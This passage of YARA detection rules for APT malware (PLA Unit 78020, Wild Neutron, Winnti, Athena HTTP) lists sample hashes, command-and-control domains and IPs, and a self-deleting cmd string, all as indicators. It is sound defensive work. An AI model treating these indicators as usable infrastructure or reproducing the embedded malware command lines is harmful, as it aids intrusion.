		$s15 = "R_eOR_eOR_eO)CiOS_eO" fullword ascii
		$s16 = "DRIVE_RAMDISK" fullword wide
		$s17 = "%s %s %s %s %d %d %d %d " fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 250KB and 1 of ($x*) ) or
		2 of ($a*) or 
		6 of ($s*) 

}

rule Unit78020_Malware_1 {
	meta:
		description = "Detects malware by Chinese APT PLA Unit 78020 - Specific Rule - msictl.exe"
		author = "Florian Roth"
		reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
		date = "2015-09-24"
		hash = "a93d01f1cc2d18ced2f3b2b78319aadc112f611ab8911ae9e55e13557c1c791a"
	strings:
		$s1 = "%ProgramFiles%\\Internet Explorer\\iexplore.exe" fullword ascii
		$s2 = "msictl.exe" fullword ascii
		$s3 = "127.0.0.1:8080" fullword ascii
		$s4 = "mshtml.dat" fullword ascii
		$s5 = "msisvc" fullword ascii
		$s6 = "NOKIAN95/WEB" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 160KB and 4 of them
}

rule Unit78020_Malware_Gen2 {
	meta:
		description = "Detects malware by Chinese APT PLA Unit 78020 - Generic Rule"
		author = "Florian Roth"
		reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
		date = "2015-09-24"
		super_rule = 1
		hash1 = "76c586e89c30a97e583c40ebe3f4ba75d5e02e52959184c4ce0a46b3aac54edd"
		hash2 = "7b73bf2d80a03eb477242967628da79924fbe06cc67c4dcdd2bdefccd6e0e1af"
		hash3 = "981e2fa1ae4145359036b46e8b53cc5da37dd2311204859761bd91572f025e8a"
	strings:
		$s0 = "-GetModuleFileNameExW" fullword ascii
		$s1 = "\\MSN Talk Start.lnk" fullword wide
		$s2 = ":SeDebugPrivilege" fullword wide
		$s3 = "WinMM Version 1.0" fullword wide
		$s4 = "dwError1 = %d" fullword ascii
		$s5 = "*Can't Get" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule Unit78020_Malware_Gen3 {
	meta:
		description = "Detects malware by Chinese APT PLA Unit 78020 - Generic Rule - Chong"
		author = "Florian Roth"
		reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
		date = "2015-09-24"
		super_rule = 1
		hash1 = "2625a0d91d3cdbbc7c4a450c91e028e3609ff96c4f2a5a310ae20f73e1bc32ac"
		hash2 = "5c62b1d16e6180f22a0cb59c99a7743f44cb4a41e4e090b9733d1fb687c8efa2"
	strings:
		$x1 = "GET http://%ws:%d/%d%s%dHTTP/1.1" fullword ascii
		$x2 = "POST http://%ws:%d/%d%s%dHTTP/1.1" fullword ascii
		$x3 = "J:\\chong\\" ascii

		$s1 = "User-Agent: Netscape" fullword ascii
		$s2 = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7" fullword ascii
		$s3 = "Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\User Shell Folders" fullword wide
		$s4 = "J:\\chong\\nod\\Release\\SslMM.exe" fullword ascii
		$s5 = "MM.exe" fullword ascii
		$s6 = "network.proxy.ssl" fullword wide
		$s7 = "PeekNamePipe" fullword ascii
		$s8 = "Host: %ws:%d" fullword ascii
		$s9 = "GET %dHTTP/1.1" fullword ascii
		$s10 = "SCHANNEL.DLL" fullword ascii /* Goodware String - occured 6 times */
	condition:
		( uint16(0) == 0x5a4d and filesize < 300KB and 1 of ($x*) ) or 
		4 of ($s*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule WildNeutron_Sample_1 {
	meta:
		description = "Wild Neutron APT Sample Rule - file 2b5065a3d0e0b8252a987ef5f29d9e1935c5863f5718b83440e68dc53c21fa94"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		hash = "2b5065a3d0e0b8252a987ef5f29d9e1935c5863f5718b83440e68dc53c21fa94"
	strings:
		$s0 = "LiveUpdater.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '25.00' */
		$s1 = "id-at-postalAddress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */
		$s2 = "%d -> %d (default)" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */
		$s3 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide /* score: '15.00' */
		$s8 = "id-ce-keyUsage" fullword ascii /* score: '12.00' */
		$s9 = "Key Usage" fullword ascii /* score: '12.00' */
		$s32 = "UPDATE_ID" fullword wide /* PEStudio Blacklist: strings */ /* score: '9.00' */
		$s37 = "id-at-commonName" fullword ascii /* score: '8.00' */
		$s38 = "2008R2" fullword wide /* PEStudio Blacklist: os */ /* score: '8.00' */
		$s39 = "RSA-alt" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00' */
		$s40 = "%02d.%04d.%s" fullword wide /* score: '7.02' */
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and all of them
}

rule WildNeutron_Sample_2 {
	meta:
		description = "Wild Neutron APT Sample Rule - file 8d80f9ef55324212759f4b6070cb8fce18a008ae9dd8b9598553206654d13a6f"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		hash = "8d80f9ef55324212759f4b6070cb8fce18a008ae9dd8b9598553206654d13a6f"
	strings:
		$s0 = "rundll32.exe \"%s\",#1" fullword wide /* PEStudio Blacklist: strings */ /* score: '33.00' */
		$s1 = "IgfxUpt.exe" fullword wide /* score: '20.00' */
		$s2 = "id-at-postalAddress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */
		$s3 = "Intel(R) Common User Interface" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */
		$s4 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide /* score: '15.00' */
		$s11 = "Key Usage" fullword ascii /* score: '12.00' */
		$s12 = "Intel Integrated Graphics Updater" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00' */
		$s13 = "%sexpires on    : %04d-%02d-%02d %02d:%02d:%02d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 600KB and all of them
}

rule WildNeutron_Sample_3 {
	meta:
		description = "Wild Neutron APT Sample Rule - file c2c761cde3175f6e40ed934f2e82c76602c81e2128187bab61793ddb3bc686d0"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		hash = "c2c761cde3175f6e40ed934f2e82c76602c81e2128187bab61793ddb3bc686d0"
	strings:
		$x1 = "178.162.197.9" fullword ascii /* score: '9.00' */
		$x2 = "\"http://fw.ddosprotected.eu:80 /opts resolv=drfx.chickenkiller.com\"" fullword wide /* PEStudio Blacklist: strings */ /* score: '33.00' */
		$x3 = ".chickenkiller.com" ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */
		
		$s1 = "LiveUpdater.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '25.00' */
		$s2 = "id-at-postalAddress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */
		$s3 = "%d -> %d (default)" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */
		$s4 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide /* score: '15.00' */
		$s5 = "id-at-serialNumber" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
		$s6 = "ECDSA with SHA256" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
		$s7 = "Acer LiveUpdater" fullword wide /* PEStudio Blacklist: strings */ /* score: '10.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 2020KB and 
		( 1 of ($x*) or all of ($s*) )
}

rule WildNeutron_Sample_4 {
	meta:
		description = "Wild Neutron APT Sample Rule - file b4005530193bc523d3e0193c3c53e2737ae3bf9f76d12c827c0b5cd0dcbaae45"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		hash = "b4005530193bc523d3e0193c3c53e2737ae3bf9f76d12c827c0b5cd0dcbaae45"
	strings:
		$x1 = "WinRAT-Win32-Release.exe" fullword ascii /* score: '22.00' */

		$s0 = "rundll32.exe \"%s\",#1" fullword wide /* PEStudio Blacklist: strings */ /* score: '33.00' */
		$s1 = "RtlUpd.EXE" fullword wide /* score: '20.00' */
		$s2 = "RtlUpd.exe" fullword wide /* score: '20.00' */
		$s3 = "Driver Update and remove for Windows x64 or x86_32" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */
		$s4 = "Realtek HD Audio Update and remove driver Tool" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00' */
		$s5 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide /* score: '15.00' */
		$s6 = "Key Usage" fullword ascii /* score: '12.00' */
		$s7 = "id-at-serialNumber" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 1240KB and all of them
}

rule WildNeutron_Sample_5 {
	meta:
		description = "Wild Neutron APT Sample Rule - file 1604e36ccef5fa221b101d7f043ad7f856b84bf1a80774aa33d91c2a9a226206"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		hash = "1604e36ccef5fa221b101d7f043ad7f856b84bf1a80774aa33d91c2a9a226206"
	strings:
		$s0 = "LiveUpdater.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '25.00' */
		$s1 = "id-at-postalAddress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00' */
		$s2 = "%d -> %d (default)" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00' */
		$s3 = "%s%s%s=%d,%s=%d,%s=%d," fullword wide /* score: '15.00' */
		$s4 = "sha-1WithRSAEncryption" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */
		$s5 = "Postal code" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.00' */
		$s6 = "id-ce-keyUsage" fullword ascii /* score: '12.00' */
		$s7 = "Key Usage" fullword ascii /* score: '12.00' */
		$s8 = "TLS-RSA-WITH-3DES-EDE-CBC-SHA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00' */
		$s9 = "%02d.%04d.%s" fullword wide /* score: '7.02' */
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule WildNeutron_Sample_6 {
	meta:
		description = "Wild Neutron APT Sample Rule - file 4bd548fe07b19178281edb1ee81c9711525dab03dc0b6676963019c44cc75865"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		hash = "4bd548fe07b19178281edb1ee81c9711525dab03dc0b6676963019c44cc75865"
	strings:
		$s0 = "mshtaex.exe" fullword wide /* score: '20.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 310KB and all of them
}

rule WildNeutron_Sample_7 {
	meta:
		description = "Wild Neutron APT Sample Rule - file a14d31eb965ea8a37ebcc3b5635099f2ca08365646437c770212d534d504ff3c"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		hash = "a14d31eb965ea8a37ebcc3b5635099f2ca08365646437c770212d534d504ff3c"
	strings:
		$s0 = "checking match for '%s' user %s host %s addr %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00' */
		$s1 = "PEM_read_bio_PrivateKey failed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */
		$s2 = "usage: %s [-ehR] [-f log_facility] [-l log_level] [-u umask]" fullword ascii /* score: '23.00' */
		$s3 = "%s %s for %s%.100s from %.200s port %d%s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */
		$s4 = "clapi32.dll" fullword ascii /* score: '21.00' */
		$s5 = "Connection from %s port %d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */
		$s6 = "/usr/etc/ssh_known_hosts" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.00' */
		$s7 = "Version: %s - %s %s %s %s" fullword ascii /* score: '16.00' */
		$s8 = "[-] connect()" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.00' */
		$s9 = "/bin/sh /usr/etc/sshrc" fullword ascii /* score: '12.42' */
		$s10 = "kexecdhs.c" fullword ascii /* score: '12.00' */
		$s11 = "%s: setrlimit(RLIMIT_FSIZE, { 0, 0 }): %s" fullword ascii /* score: '11.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and all of them
}

rule WildNeutron_Sample_8 {
	meta:
		description = "Wild Neutron APT Sample Rule - file 758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		hash = "758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92"
	strings:
		$x1 = "RunFile: couldn't load SHELL32.DLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */
		$x2 = "RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00' */
		$x3 = "Error executing CreateProcess()!!" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00' */
		$x4 = "cmdcmdline" fullword wide /* score: '11.00' */
		$x5 = "Invalid input handle!!!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */

		$s1 = "Process %d terminated" fullword wide /* PEStudio Blacklist: strings */ /* score: '24.00' */
		$s2 = "Process is not running any more" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00' */
		$s3 = "javacpl.exe" fullword wide /* score: '3.00' */ /* Goodware String - occured 2 times */
		$s4 = "Windows NT Version %lu.%lu" fullword wide /* PEStudio Blacklist: os */ /* score: '19.00' */
		$s5 = "Usage: destination [reference]" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00' */
		$s6 = ".com;.exe;.bat;.cmd" fullword wide /* score: '15.00' */
		$s7 = ") -%s-> %s (" fullword ascii /* score: '14.00' */
		$s8 = "cmdextversion" fullword wide /* score: '14.00' */
		$s9 = "Invalid pid (%s)" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00' */
		$s10 = "\"%s\" /K %s" fullword wide /* score: '11.02' */
		$s11 = "Error setting %s (%s)" fullword wide /* score: '11.00' */
		$s12 = "DEBUG: Cannot allocate memory for ptrNextNode->ptrNext!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
		$s13 = "Failed to build full directory path" fullword wide /* score: '10.00' */
		$s14 = "DEBUG: Cannot allocate memory for ptrFileArray!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00' */
		$s15 = "%-8s %-3s  %*s %s  %s" fullword wide /* score: '8.00' */
		$s16 = " %%%c in (%s) do " fullword wide /* score: '8.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 1677KB and 2 of ($x*) and 6 of ($s*)
}

rule WildNeutron_Sample_9 {
	meta:
		description = "Wild Neutron APT Sample Rule - file 781eb1e17349009fbae46aea5c59d8e5b68ae0b42335cb035742f6b0f4e4087e"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		hash = "781eb1e17349009fbae46aea5c59d8e5b68ae0b42335cb035742f6b0f4e4087e"
	strings:
		$s0 = "http://get.adobe.com/flashplayer/" fullword wide /* PEStudio Blacklist: strings */ /* score: '30.00' */
		$s1 = "xxxxxxxxxxxxxxxxxxxx" fullword wide /* reversed goodware string 'xxxxxxxxxxxxxxxxxxxx' */ /* score: '19.00' */
		$s4 = " Player Installer/Uninstaller" fullword wide /* PEStudio Blacklist: strings */ /* score: '11.42' */
		$s5 = "Adobe Flash Plugin Updater" fullword wide /* PEStudio Blacklist: strings */ /* score: '11.00' */
		$s6 = "uSOFTWARE\\Adobe" fullword wide /* PEStudio Blacklist: strings */ /* score: '10.42' */
		$s11 = "2008R2" fullword wide /* PEStudio Blacklist: os */ /* score: '8.00' */
		$s12 = "%02d.%04d.%s" fullword wide /* score: '7.02' */
		$s13 = "%d -> %d" fullword wide /* score: '7.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and all of them
}

rule WildNeutron_Sample_10 {
	meta:
		description = "Wild Neutron APT Sample Rule - file 1d3bdabb350ba5a821849893dabe5d6056bf7ba1ed6042d93174ceeaa5d6dad7"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		hash = "1d3bdabb350ba5a821849893dabe5d6056bf7ba1ed6042d93174ceeaa5d6dad7"
	strings:
		$n1 = "/c for /L %%i in (1,1,2) DO ping 127.0.0.1 -n 3 & type %%windir%%\\notepad.exe > %s & del /f %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '46.00' */
		
		$s1 = "%SYSTEMROOT%\\temp\\_dbg.tmp" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00' */
		$s2 = "%SYSTEMROOT%\\SysWOW64\\mspool.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */
		$s3 = "%SYSTEMROOT%\\System32\\dpcore16t.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */
		$s4 = "%SYSTEMROOT%\\System32\\wdigestEx.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */
		$s5 = "%SYSTEMROOT%\\System32\\mspool.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.17' */
		$s6 = "%SYSTEMROOT%\\System32\\kernel32.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */
		$s7 = "%SYSTEMROOT%\\SysWOW64\\iastor32.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */
		$s8 = "%SYSTEMROOT%\\System32\\msvcse.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */
		$s9 = "%SYSTEMROOT%\\System32\\mshtaex.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */
		$s10 = "%SYSTEMROOT%\\System32\\iastor32.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */
		$s11 = "%SYSTEMROOT%\\SysWOW64\\mshtaex.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.17' */
		
		$x1 = "wdigestEx.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00' */
		$x2 = "dpcore16t.dll" fullword ascii /* score: '21.00' */
		$x3 = "mspool.dll" fullword ascii /* score: '21.00' */
		$x4 = "msvcse.exe" fullword ascii /* score: '20.00' */
		$x5 = "mshtaex.exe" fullword wide /* score: '20.00' */
		$x6 = "iastor32.exe" fullword ascii /* score: '20.00' */

		$y1 = "Installer.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00' */
		$y2 = "Info: Process %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00' */
		$y3 = "Error: GetFileTime %s 0x%x" fullword ascii /* score: '17.00' */
		$y4 = "Install succeeded" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00' */
		$y5 = "Error: RegSetValueExA 0x%x" fullword ascii /* score: '9.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and 
		(
			$n1 or ( 1 of ($s*) and 1 of ($x*) and 3 of ($y*) ) 
		)
}

/* Super Rules ------------------------------------------------------------- */

rule WildNeutron_javacpl {
	meta:
		description = "Wild Neutron APT Sample Rule - from files 683f5b476f8ffe87ec22b8bab57f74da4a13ecc3a5c2cbf951999953c2064fc9, 758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92, 8ca7ed720babb32a6f381769ea00e16082a563704f8b672cb21cf11843f4da7a"
		author = "Florian Roth"
		reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
		date = "2015-07-10"
		score = 60
		super_rule = 1
		hash1 = "683f5b476f8ffe87ec22b8bab57f74da4a13ecc3a5c2cbf951999953c2064fc9"
		hash2 = "758e6b519f6c0931ff93542b767524fc1eab589feb5cfc3854c77842f9785c92"
		hash3 = "8ca7ed720babb32a6f381769ea00e16082a563704f8b672cb21cf11843f4da7a"
	strings:
		$x1 = "javacpl.exe" fullword wide /* score: '3.00' */ /* Goodware String - occured 2 times */

		$s0 = "RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00' */
		$s1 = "Error executing CreateProcess()!!" fullword wide /* PEStudio Blacklist: strings */ /* score: '31.00' */
		$s2 = "http://www.java.com/en/download/installed.jsp?detect=jre" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */
		$s3 = "RunFile: couldn't load SHELL32.DLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */
		$s4 = "Process is not running any more" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00' */
		$s6 = "Windows NT Version %lu.%lu" fullword wide /* PEStudio Blacklist: os */ /* score: '19.00' */
		$s7 = "Usage: destination [reference]" fullword wide /* PEStudio Blacklist: strings */ /* score: '16.00' */
		$s8 = "Invalid input handle!!!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */
		$s9 = ".com;.exe;.bat;.cmd" fullword wide /* score: '15.00' */
		$s10 = ") -%s-> %s (" fullword ascii /* score: '14.00' */
		$s11 = "cmdextversion" fullword wide /* score: '14.00' */
		$s12 = "Invalid pid (%s)" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00' */
		$s13 = "\"%s\" /K %s" fullword wide /* score: '11.02' */
		$s14 = "Error setting %s (%s)" fullword wide /* score: '11.00' */
		$s16 = "cmdcmdline" fullword wide /* score: '11.00' */
		$s39 = "2008R2" fullword ascii /* PEStudio Blacklist: os */ /* score: '8.00' */
	condition:
		uint16(0) == 0x5a4d and filesize < 1677KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-10-10
	Identifier: Winnti Malware
*/

rule Winnti_signing_cert {
	meta:
		description = "Detects a signing certificate used by the Winnti APT group"
		author = "Florian Roth"
		reference = "https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/"
		date = "2015-10-10"
		score = 75
		hash1 = "a9a8dc4ae77b1282f0c8bdebd2643458fc1ceb3145db4e30120dd81676ff9b61"
		hash2 = "9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672"
	strings:
		$s1 = "Guangzhou YuanLuo Technology Co." ascii
		$s2 = "Guangzhou YuanLuo Technology Co.,Ltd" ascii
		$s3 = "$Asahi Kasei Microdevices Corporation0" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and 1 of them
}

rule Winnti_malware_Nsiproxy {
	meta:
		description = "Detects a Winnti rootkit"
		author = "Florian Roth"
		date = "2015-10-10"
		score = 75
		hash1 = "9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672"
		hash2 = "cf1e006694b33f27d7c748bab35d0b0031a22d193622d47409b6725b395bffb0"
		hash3 = "326e2cabddb641777d489a9e7a39d52c0dc2dcb1fde1762554ea162792056b6e"
		hash4 = "aff7c7478fe33c57954b6fec2095efe8f9edf5cdb48a680de9439ba62a77945f"
		hash5 = "ba7ccd027fd2c826bbe8f2145d5131eff906150bd98fe25a10fbee2c984df1b8"
	strings:
		$x1 = "\\Driver\\nsiproxy" fullword wide

		$a1 = "\\Device\\StreamPortal" fullword wide
		$a2 = "\\Device\\PNTFILTER" fullword wide

		$s1 = "Cookie: SN=" fullword ascii
		$s2 = "\\BaseNamedObjects\\_transmition_synchronization_" fullword wide
		$s3 = "Winqual.sys" fullword wide
		$s4 = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}" fullword wide
		$s5 = "http://www.wasabii.com.tw 0" fullword ascii
	condition:
		uint16(0) == 0x5a4d and $x1 and 1 of ($a*) and 2 of ($s*)
}

rule Winnti_malware_UpdateDLL {
	meta:
		description = "Detects a Winnti malware - Update.dll"
		author = "Florian Roth"
		reference = "VTI research"
		date = "2015-10-10"
		score = 75
		hash1 = "1b449121300b0188ff9f6a8c399fb818d0cf53fd36cf012e6908a2665a27f016"
		hash2 = "50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a"
		hash3 = "6cdb65dbfb2c236b6d149fd9836cb484d0608ea082cf5bd88edde31ad11a0d58"
		hash4 = "50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a"
	strings:
		$c1 = "'Wymajtec$Tima Stempijg Sarviges GA -$G2" fullword ascii
		$c2 = "AHDNEAFE1.sys" fullword ascii
		$c3 = "SOTEFEHJ3.sys" fullword ascii
		$c4 = "MainSYS64.sys" fullword ascii

		$s1 = "\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" fullword wide
		$s2 = "Update.dll" fullword ascii
		$s3 = "\\\\.\\pipe\\usbpcex%d" fullword wide
		$s4 = "\\\\.\\pipe\\usbpcg%d" fullword wide
		$s5 = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\WMI" fullword wide
		$s6 = "\\??\\pipe\\usbpcg%d" fullword wide
		$s7 = "\\??\\pipe\\usbpcex%d" fullword wide
		$s8 = "HOST: %s" fullword ascii
		$s9 = "$$$--Hello" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and
		(
			( 1 of ($c*) and 3 of ($s*) ) or all of ($s*)
		)
}
rule Winnti_malware_FWPK {
	meta:
		description = "Detects a Winnti malware - FWPKCLNT.SYS"
		author = "Florian Roth"
		reference = "VTI research"
		date = "2015-10-10"
		score = 75
		hash1 = "1098518786c84b0d31f215122275582bdcd1666653ebc25d50a142b4f5dabf2c"
		hash2 = "9a684ffad0e1c6a22db1bef2399f839d8eff53d7024fb014b9a5f714d11febd7"
		hash3 = "a836397817071c35e24e94b2be3c2fa4ffa2eb1675d3db3b4456122ff4a71368"
	strings:
		$s0 = "\\Registry\\Machine\\System\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\" fullword wide
		$s1 = "%x:%d->%x:%d, Flag %s%s%s%s%s, seq %u, ackseq %u, datalen %u" fullword ascii
		$s2 = "FWPKCLNT.SYS" fullword ascii
		$s3 = "Port Layer" fullword wide
		$s4 = "%x->%x, icmp type %d, code %d" fullword ascii
		$s5 = "\\BaseNamedObjects\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28E}" fullword wide
		$s6 = "\\Ndi\\Interfaces" fullword wide
		$s7 = "\\Device\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}" fullword wide
		$s8 = "Bad packet" fullword ascii
		$s9 = "\\BaseNamedObjects\\EKV0000000000" fullword wide
		$s10 = "%x->%x" fullword ascii
		$s11 = "IPInjectPkt" fullword ascii /* Goodware String - occured 6 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 642KB and all of them
}

rule Winnti_malware_StreamPortal_Gen {
	meta:
		description = "Detects a Winnti malware - Streamportal"
		author = "Florian Roth"
		reference = "VTI research"
		date = "2015-10-10"
		score = 75
		hash1 = "326e2cabddb641777d489a9e7a39d52c0dc2dcb1fde1762554ea162792056b6e"
		hash2 = "9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672"
		hash3 = "aff7c7478fe33c57954b6fec2095efe8f9edf5cdb48a680de9439ba62a77945f"
	strings:
		$s0 = "Proxies destination address/port for TCP" fullword wide
		$s3 = "\\Device\\StreamPortal" fullword wide
		$s4 = "Transport-Data Proxy Sub-Layer" fullword wide
		$s5 = "Cookie: SN=" fullword ascii
		$s6 = "\\BaseNamedObjects\\_transmition_synchronization_" fullword wide
		$s17 = "NTOSKRNL.EXE" fullword wide /* Goodware String - occured 4 times */
		$s19 = "FwpsReferenceNetBufferList0" fullword ascii /* Goodware String - occured 5 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 275KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule AthenaHTTP
{
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2014-08-09"
        description = "Identify Athena HTTP"
    strings:
        $s1 = "%s(%s)"
        $s2 = "type:on_exec"
        $s3 = "uid:%s"
        $s4 = "priv:%s"
        $s5 = "arch:x%s"
        $s6 = "gend:%s"
        $s7 = "cores:%i"
        $s8 = "ver:%s"
        $s9 = "net:%s"
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule SNOWGLOBE_Babar_Malware {
	meta:
